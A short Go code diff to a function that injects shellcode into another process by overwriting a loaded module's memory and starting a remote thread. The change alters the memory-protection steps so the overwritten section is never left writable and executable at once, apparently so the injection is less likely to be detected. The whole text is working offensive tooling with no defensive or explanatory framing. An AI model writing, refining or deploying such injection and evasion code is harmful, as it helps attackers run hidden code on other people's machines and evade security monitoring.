@@ -74,11 +74,11 @@ func moduleStompInject(pid uint32, shellcode []byte) error {
 	r1, _, _ := procVirtualProtectEx.Call(
 		hProc, targetAddr,
 		uintptr(len(shellcode)),
-		uintptr(PAGE_EXECUTE_READWRITE),
+		uintptr(PAGE_READWRITE),
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
 	if r1 == 0 {
-		return fmt.Errorf("VirtualProtectEx RWX failed")
+		return fmt.Errorf("VirtualProtectEx RW failed")
 	}
 
 	var written uintptr
@@ -93,12 +93,15 @@ func moduleStompInject(pid uint32, shellcode []byte) error {
 		return fmt.Errorf("WriteProcessMemory failed")
 	}
 
+	// Restore the original (RX) protection BEFORE spawning the thread so the
+	// stomped module section is never left RWX.
+	procVirtualProtectEx.Call(hProc, targetAddr, uintptr(len(shellcode)), uintptr(oldProtect), 0)
+
 	thread, _, _ := procCreateRemoteThread.Call(
 		hProc, 0, 0,
 		targetAddr, 0, 0, 0,
 	)
 	if thread == 0 {
-		procVirtualProtectEx.Call(hProc, targetAddr, uintptr(len(shellcode)), uintptr(oldProtect), 0)
 		return fmt.Errorf("CreateRemoteThread failed")
 	}
 	procCloseHandle.Call(thread)
